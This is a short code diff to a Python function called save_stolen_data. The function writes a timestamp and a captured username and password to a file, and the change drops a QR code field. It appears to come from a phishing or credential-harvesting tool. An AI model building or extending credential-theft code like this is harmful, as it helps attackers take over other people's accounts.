@@ -47,7 +47,6 @@ def save_stolen_data(login_flow: LoginFlow) -> None:
             f"Data acquired at: {datetime.now(timezone.utc)} (UTC)\n"
             f"Username: {login_flow.username}\n"
             f"Password: {login_flow.password}\n"
-            f"QR Code: {login_flow.qr_code}\n"
         )
 
         file.write_text(content, encoding="utf-8")
